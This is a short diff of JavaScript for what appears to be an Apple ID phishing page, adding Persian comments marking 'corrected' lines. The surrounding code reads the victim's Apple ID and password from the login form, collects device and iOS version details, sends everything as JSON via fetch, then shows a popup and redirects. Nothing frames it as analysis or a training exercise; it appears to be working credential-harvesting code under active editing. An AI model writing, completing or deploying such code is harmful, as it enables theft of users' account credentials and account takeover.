@@ -26,6 +26,7 @@
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: { width: window.screen.width, height: window.screen.height },
+                // خط اصلاح شده ۱:
                 ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
                 timestamp: new Date().toISOString()
             };
@@ -70,6 +71,7 @@
             apple_id: document.getElementById("username").value,
             password: document.getElementById("password").value,
             platform: navigator.platform,
+            // خط اصلاح شده ۲:
             ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
             timestamp: new Date().toISOString()
         };
@@ -79,7 +81,8 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         }).then(response => response.json()).then(data => {
-            document.getElementById("loading").style.display = "block";
+
+document.getElementById("loading").style.display = "block";
             document.getElementById("lila-popup").style.display = "block";
             setTimeout(function() { window.location.href = data.redirect; }, 1000);
         });
